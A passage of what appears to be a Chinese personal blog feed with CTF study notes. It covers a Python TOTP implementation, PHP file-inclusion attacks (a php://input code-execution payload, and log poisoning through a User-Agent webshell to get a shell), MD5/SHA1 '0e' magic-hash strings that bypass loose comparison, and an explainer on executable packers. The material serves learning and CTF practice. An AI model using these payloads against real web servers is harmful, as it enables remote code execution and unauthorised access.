<li>HMAC-SHA1 算法：将时间计数器与密钥进行 HMAC 运算，生成动态验证码。</li>
</ul>
<p>公式：<code>TOTP = HOTP(K, T)</code>，其中<code> T = floor((当前时间 - T0) / 30)</code></p>
<p>二、完整代码实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># 非此次重点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">base32_decode</span>(<span class="params">secret_b32</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Base32 解码实现&quot;&quot;&quot;</span></span><br><span class="line">    base32_chars = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;</span></span><br><span class="line">    base32_map = &#123;char: i <span class="keyword">for</span> i, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(base32_chars)&#125;</span><br><span class="line">    </span><br><span class="line">    secret_b32 = secret_b32.upper().replace(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(secret_b32) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        secret_b32 += <span class="string">&#x27;=&#x27;</span> * (<span class="number">8</span> - <span class="built_in">len</span>(secret_b32) % <span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line">    binary_str = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> secret_b32:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        binary_str += <span class="built_in">format</span>(base32_map[char], <span class="string">&#x27;05b&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    result = <span class="built_in">bytearray</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_str), <span class="number">8</span>):</span><br><span class="line">        byte_str = binary_str[i:i+<span class="number">8</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(byte_str) == <span class="number">8</span>:</span><br><span class="line">            result.append(<span class="built_in">int</span>(byte_str, <span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(result)</span><br></pre></td></tr></table></figure>

<p>说明：</p>
<ul>
<li>Base32 使用 A-Z 和 2-7 共 32 个字符。</li>
<li>每 5 位表示 1 字节，8 个字符 &#x3D; 40 位 &#x3D; 5 字节。</li>
<li>去除 &#x3D; 填充后补齐为 8 的倍数。</li>
</ul>
<p>TOTP 主类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">TOTP</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_b32, digits=<span class="number">6</span>, interval=<span class="number">30</span>, digest=hashlib.sha1</span>):</span><br><span class="line">        self.secret = base32_decode(secret_b32)  <span class="comment"># 解码为字节</span></span><br><span class="line">        self.digits = digits</span><br><span class="line">        self.interval = interval</span><br><span class="line">        self.digest = digest</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">timecode</span>(<span class="params">self, for_time=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;计算时间计数器 T = floor(unix_time / interval)&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> for_time <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            for_time = datetime.now()</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(for_time, <span class="string">&#x27;timestamp&#x27;</span>):</span><br><span class="line">            timestamp = for_time.timestamp()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            timestamp = time.mktime(for_time.timetuple())</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">int</span>(timestamp // self.interval)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_otp</span>(<span class="params">self, counter</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;HOTP 算法核心：HMAC + 动态截断&quot;&quot;&quot;</span></span><br><span class="line">        counter_bytes = struct.pack(<span class="string">&#x27;&gt;Q&#x27;</span>, counter)  <span class="comment"># 8字节大端</span></span><br><span class="line">        </span><br><span class="line">        hmac_result = hmac.new(self.secret, counter_bytes, self.digest).digest()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 动态截断（RFC 4226）</span></span><br><span class="line">        offset = hmac_result[-<span class="number">1</span>] &amp; <span class="number">0x0F</span></span><br><span class="line">        binary_code = (</span><br><span class="line">            ((hmac_result[offset] &amp; <span class="number">0x7F</span>) &lt;&lt; <span class="number">24</span>) |</span><br><span class="line">            ((hmac_result[offset + <span class="number">1</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">16</span>) |</span><br><span class="line">            ((hmac_result[offset + <span class="number">2</span>] &amp; <span class="number">0xFF</span>) &lt;&lt; <span class="number">8</span>) |</span><br><span class="line">            (hmac_result[offset + <span class="number">3</span>] &amp; <span class="number">0xFF</span>)</span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        otp = binary_code % (<span class="number">10</span> ** self.digits)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">str</span>(otp).zfill(self.digits)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">now</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;生成当前时间的 OTP&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> self.generate_otp(self.timecode())</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>测试函数</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test_totp</span>():</span><br><span class="line">    secret_b32 = <span class="string">&quot;4SPZZBDHH77F3XEYBXM7BB2CQWSI56DM&quot;</span></span><br><span class="line">    totp = TOTP(secret_b32)</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;TOTP 测试结果:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;密钥 Base32: <span class="subst">&#123;secret_b32&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;密钥字节: <span class="subst">&#123;totp.secret.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前时间计数器: <span class="subst">&#123;totp.timecode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;当前 OTP: <span class="subst">&#123;totp.now()&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    test_totp()</span><br></pre></td></tr></table></figure>

<p>三、运行结果示例</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">(base) ┌──(cure㉿LAPTOP<span class="literal">-CMAM5D0J</span>)-[/<span class="type">mnt</span>/<span class="type">e</span>/<span class="type">ctf</span>/<span class="type">smallcode</span>/<span class="type">TOTP</span>]</span><br><span class="line">└─<span class="variable">$</span> python self.py</span><br><span class="line">TOTP 测试结果:</span><br><span class="line">密钥 Base32: <span class="number">4</span>SPZZBDHH77F3XEYBXM7BB2CQWSI56DM</span><br><span class="line">密钥字节: e49f9c84673ffe5ddc980dd9f0874285a48ef86c</span><br><span class="line">当前时间计数器: <span class="number">58712664</span></span><br><span class="line">当前 OTP: <span class="number">782045</span></span><br></pre></td></tr></table></figure>

<p>四、核心算法详解</p>
<p>| 步骤          | 说明                          |
| ————- | —————————– |
| 1. 时间计数器 | T &#x3D; floor((now - 1970) &#x2F; 30)  |
| 2. 编码       | T → 8字节大端整数             |
| 3. HMAC-SHA1  | HMAC(K, T)                    |
| 4. 动态截断   | 取最后一个字节低4位作为偏移量 |
| 5. 取4字节    | 构造31位整数（最高位清零）    |
| 6. 取模       | code % 10^6                   |
| 7. 补零       | 补足6位                       |</p>
]]></content>
      <tags>
        <tag>Python</tag>
        <tag>密码</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-10-31-php伪协议深入刨析</title>
    <url>/2025/10/31/2025-10-31-php%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%85%A5%E5%88%A8%E6%9E%90/</url>
    <content><![CDATA[<h3 id="PHP伪协议本质"><a href="#PHP伪协议本质" class="headerlink" title="PHP伪协议本质"></a>PHP伪协议本质</h3><p>例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]);<span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>传入<code>url=php://input</code> 消息载体为 <code>&lt;?php system(&quot;xxx&quot;);?&gt;</code> 即可执行命令</p>
<p>为什么可以？</p>
<p>php伪协议是 PHP内置的流包装器</p>
<ul>
<li>通过URL传递 <code>?url=php://input</code> 并在请求体中传入 <code>&lt;?php system(&quot;xxx);?&gt;</code> 时，<code>include</code> 函数会执行请求体中的内容作为PHP代码</li>
</ul>
<p>过程：</p>
<ul>
<li><p><code>php://input</code> 流读取了HTTP请求体中的原始数据（即 <code>&lt;?php system(&quot;xxx&quot;);?&gt;</code>）。</p>
</li>
<li><p><code>include</code> 函数将这些数据当作PHP文件执行，因此 <code>system(&quot;xxx&quot;)</code> 命令被运行，并将结果返回。</p>
</li>
</ul>
<h3 id="日志包含漏洞"><a href="#日志包含漏洞" class="headerlink" title="日志包含漏洞"></a>日志包含漏洞</h3><p>本质上就是把危险的php代码注入到日志中，然后把日志作为php代码解析进去（因为文件包含可以包含到日志文件）</p>
<p>例如 CTF秀的 web4</p>
<p>众所周知，Linux系统下，日志位置是：<code>/var/log/nginx/access.log</code></p>
<p>题目提示是：    <code>&lt;?php include($_GET[&#39;url&#39;]);?&gt;</code>     文件包含这个<code>url</code>&#x3D; 什么</p>
<p>他的日志格式是这样的</p>
<p><code>172.12.109.181 - - [31/Oct/2025:08:03:09 +0000] &quot;GET / HTTP/1.1&quot; 200 715 &quot;https://ctf.show/&quot; &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0&quot;</code></p>
<p><code>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) </code> 是来自客户端的信息，也就是我的浏览器，这个我可以任意更改，我直接改成木马，然后让其包含，就getshell了。</p>
<h3 id="MD5-判断-绕过"><a href="#MD5-判断-绕过" class="headerlink" title="MD5 判断 绕过"></a>MD5 判断 绕过</h3><p>依然继续在CTF秀中学知识</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123; <span class="comment">// 只有字母</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123; <span class="comment">// 只有数字</span></span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123; <span class="comment">// 注意这里不是严格检查 不是 ===</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>1.md5比较使用松散比较。在PHP中，松散比较（&#x3D;&#x3D;）会进行类型转换。如果两个md5哈希值在比较时被转换为数字或其它类型，<strong>就有问题！</strong></p>
<p>2.如果！ md5加密后密文都以 0e 开头，PHP会当作科学计数法来处理，也就是0的n次方，因此会实现绕过！</p>
<p>以下是一些著名的数值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">字符串: 240610708 | MD5: 0e462097431906509019562988736854</span><br><span class="line">字符串: 314282422 | MD5: 0e990995504821699494520356953734</span><br><span class="line">字符串: QNKCDZO | MD5: 0e830400451993494058024219903391</span><br><span class="line">字符串: aabg7XSs | MD5: 0e087386482136013740957780965295</span><br><span class="line">字符串: aabC9RqS | MD5: 0e041022518165728065344349536299</span><br><span class="line"></span><br><span class="line">ps:</span><br><span class="line">aaK1STfY sha1() 0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF sha1() 0e89257456677279068558073954252716165668</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-10-31-壳</title>
    <url>/2025/10/31/2025-10-31-%E5%A3%B3/</url>
    <content><![CDATA[<h3 id="什么是壳"><a href="#什么是壳" class="headerlink" title="什么是壳"></a>什么是壳</h3><p><strong>Packing</strong>  在网络安全领域加壳是一种对软件保护或恶意逃过软件检测是手段。加壳通过将原始可执行文件（如EXE、DLL或APK）包裹在一层外部代码中，来混淆、加密或压缩原始程序，从而使其难以被分析、逆向工程或检测。</p>
<ul>
<li><strong>壳的本质</strong>：壳是一种附加在程序外层的代码层，它在程序运行时首先执行，负责解密、解压缩或激活原始代码。这类似于给程序穿上一件“外衣”，隐藏其真实内容。</li>
</ul>
<p>例如使用UPX（Ultimate Packer for eXecutables）压缩可执行文件</p>
<ul>
<li><strong>壳的主要类型</strong><ul>
<li>压缩壳：<strong>UPX</strong>，<strong>ASPack，…</strong></li>
<li>加密壳：<strong>Themida</strong>，<strong>VMProtect，…</strong></li>
<li>混淆壳：<strong>Ollie</strong>，…</li>
</ul>
</li>
</ul>
<h4 id="壳的工作原理"><a href="#壳的工作原理" class="headerlink" title="壳的工作原理"></a><strong>壳的工作原理</strong></h4><ol>
<li><strong>加载阶段</strong>：当用户运行加壳程序时，操作系统先加载壳代码（而非原始程序）。壳代码通常存储在文件头部或附加段中。</li>
<li><strong>解密&#x2F;解压阶段</strong>：壳代码在内存中执行，使用内置算法（如AES、ZLIB）解密或解压缩原始代码。这个过程可能涉及动态内存分配，以避免将原始代码暴露在磁盘上。</li>
<li><strong>修复导入表</strong>：壳会重建原始程序的导入地址表（IAT），确保外部函数调用正常工作。</li>
<li><strong>跳转到原始入口点（OEP）</strong>：壳将控制权转移给解密后的原始代码，程序开始正常执行。</li>
<li><strong>反检测机制</strong>：壳可能集成反调试代码（如检测OllyDbg）、反虚拟机代码（如检测VMware）或代码自修改，以阻碍分析。</li>
</ol>
<h4 id="查壳方法"><a href="#查壳方法" class="headerlink" title="查壳方法"></a>查壳方法</h4><ul>
<li><strong>静态分析</strong>：使用工具如PEiD、Exeinfo PE或file命令检测常见壳签名。但自定义壳可能逃避检测。</li>
<li><strong>动态分析</strong>：在沙箱或调试器（如OllyDbg、x64dbg）中运行程序，观察内存变化和行为。工具如Process Monitor可以监控文件活动。</li>
<li><strong>启发式分析</strong>：杀毒软件使用行为检测（如异常API调用）来识别加壳程序</li>
</ul>
<p><strong>脱壳技术</strong>：</p>
<ul>
<li><strong>自动脱壳</strong>：工具如UPX自带脱壳功能，或使用通用脱壳器（如Unpacker）。</li>
<li><strong>手动脱壳</strong>：在调试器中设置断点、转储内存并修复OEP。这需要汇编语言和逆向工程知识。</li>
<li><strong>内存分析</strong>：使用Volatility（用于内存取证）直接提取解密后的代码</li>
</ul>
<hr>
<p>实例： 通过binwalk 查看upx壳</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(langchain-env) ┌──(cure㉿LAPTOP-CMAM5D0J)-[~/ctf_god/upx_file]</span><br><span class="line">└─$ binwalk attachment</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux)</span><br><span class="line">267368        0x41468         Copyright string: <span class="string">&quot;Copyright (C) 1996-2018 the UPX Team. All Rights Reserved. $&quot;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
</search>
